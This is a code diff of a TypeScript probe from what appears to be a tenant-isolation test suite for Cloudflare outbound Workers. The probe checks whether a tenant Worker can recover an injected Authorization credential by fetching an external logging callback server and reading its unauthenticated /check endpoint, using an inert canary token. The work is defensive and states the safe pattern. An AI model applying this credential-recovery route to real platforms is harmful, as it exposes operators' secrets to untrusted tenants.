@@ -1,8 +1,8 @@
 import type { Probe } from "./index.js";
-import { base, invokeTenant, namespaceMode } from "./_helpers.js";
+import { base, invokeTenant, namespaceMode, callbackTarget, checkCallback } from "./_helpers.js";
 
 // The inert credential wulf-outbound injects (see wrangler.outbound.toml
-// WULF_OUTBOUND_AUTH_TOKEN). Reflecting it back proves the user Worker can read it.
+// WULF_OUTBOUND_AUTH_TOKEN). Recovering it proves the user Worker can read it back.
 const INJECTED_TOKEN = "wulf-outbound-injected-canary";
 
 /**
@@ -10,47 +10,56 @@ const INJECTED_TOKEN = "wulf-outbound-injected-canary";
  *
  * Outbound Workers commonly inject auth (mint a JWT, add an API key) on allowlisted
  * requests, assuming the user Worker can't see the credential. This tests that
- * assumption: prey fetches an allowlisted **header-reflecting** upstream (`wulf-echo`
- * on *.workers.dev); wulf-outbound injects `Authorization: Bearer <token>` on the way
- * out; the echo reflects it; prey reads it back from the response body.
+ * assumption against a **logging** upstream: prey fetches the (allowlisted) callbackd
+ * endpoint; wulf-outbound injects `Authorization: Bearer <token>` on the way out;
+ * callbackd records the request headers and exposes them via its unauthenticated
+ * `/check`. The user Worker thus recovers the operator-injected credential.
  *
- * Documents the safe pattern: inject only to non-reflecting upstreams / scope
- * credentials per-tenant.
+ * (Worker→*.workers.dev subrequests are rejected by the edge — CF error 1042 — so a
+ * workers.dev reflector can't be used; the external callbackd droplet works.)
+ * Documents the safe pattern: inject only to non-logging/non-reflecting upstreams and
+ * scope credentials per-tenant.
  */
 export const pCap03: Probe = async (c) => {
   const mode = namespaceMode(c.req);
-  const echoUrl = c.env.WULF_ECHO_URL ?? "https://wulf-echo.sharted.workers.dev/";
-  const resp = await invokeTenant<Record<string, unknown>>(c, "tenant-prey", "echo-fetch", { target: echoUrl }, { mode });
-  const body = (resp.body ?? {}) as { reachable?: boolean; status?: number; body?: string };
-  const bodyStr = JSON.stringify(resp.body ?? {});
+  const since = new Date(Date.now() - 5000).toISOString();
+  const target = callbackTarget(c, "P-CAP-03");
 
-  const tokenVisible = bodyStr.includes(INJECTED_TOKEN);
-  const authHeaderReflected = /"authorization"/i.test(bodyStr);
-  // The reflecting upstream must actually be reachable through the outbound path for
-  // the test to be conclusive. Worker→*.workers.dev subrequests are rejected by the
-  // edge (CF error 1042), so a workers.dev echo can't be exercised in this deploy.
-  const upstreamReachable = body.reachable === true && (body.status ?? 0) < 400 && !/error code: 1042/i.test(body.body ?? "");
+  // Prey fetches the logging upstream through the outbound Worker (which injects auth).
+  const fetchResp = await invokeTenant<Record<string, unknown>>(c, "tenant-prey", "echo-fetch", { target }, { mode });
 
-  const result = tokenVisible ? "accessible" : upstreamReachable ? "blocked" : "partial";
+  // Recover what the upstream captured — the path a user Worker would also take.
+  const check = await checkCallback(c, "P-CAP-03", since);
+  const checkStr = JSON.stringify(check);
+  const directStr = JSON.stringify(fetchResp.body ?? {});
+
+  const credentialInUpstreamLog = checkStr.includes(INJECTED_TOKEN);
+  const credentialInDirectResponse = directStr.includes(INJECTED_TOKEN);
+  const authHeaderLogged = /authorization/i.test(checkStr);
+  const credentialVisible = credentialInUpstreamLog || credentialInDirectResponse;
+  const reachedUpstream = (check as { found?: boolean }).found === true;
+
+  const result = credentialVisible ? "accessible" : reachedUpstream ? "blocked" : "partial";
 
   return base({
     test_id: "P-CAP-03",
     track: "platform",
-    description: "Outbound-Worker injected-credential exposure via a reflecting allowlisted upstream",
+    description: "Outbound-Worker injected-credential exposure via a logging/reflecting allowlisted upstream",
     result,
-    severity: tokenVisible ? "high" : "informational",
+    severity: credentialVisible ? "high" : "informational",
     run_id: c.runId,
     details: {
       namespace: mode,
-      echo_target: echoUrl,
+      upstream: target,
       outbound_injects_header: "Authorization",
-      reflecting_upstream_reachable: upstreamReachable,
-      authorization_header_reflected: authHeaderReflected,
-      credential_visible_to_user_worker_via_echo: tokenVisible,
-      echo_response: resp.body,
-      note: upstreamReachable
-        ? "If the allowlisted upstream reflects request headers, the user Worker reads back the operator-injected credential. Operators should inject only to non-reflecting upstreams / scope credentials per-tenant."
-        : "INCONCLUSIVE: the reflecting echo upstream was unreachable through the outbound path (CF error 1042 blocks Worker→*.workers.dev subrequests). To demonstrate the positive case, host the reflector on a custom domain on the outbound allowlist. The injection mechanism (wulf-outbound adds Authorization) is confirmed by code.",
+      reached_upstream: reachedUpstream,
+      injected_credential_logged_by_upstream: credentialInUpstreamLog,
+      injected_credential_in_direct_response: credentialInDirectResponse,
+      authorization_header_present_in_upstream_log: authHeaderLogged,
+      credential_visible_to_user_worker: credentialVisible,
+      direct_response: fetchResp.body,
+      upstream_check: check,
+      note: "wulf-outbound injects Authorization on allowlisted fetches; callbackd logs request headers and exposes them via the unauthenticated /check, so the user Worker recovers the operator-injected credential. Operators should inject only to non-logging/non-reflecting upstreams and scope credentials per-tenant.",
     },
   });
 };
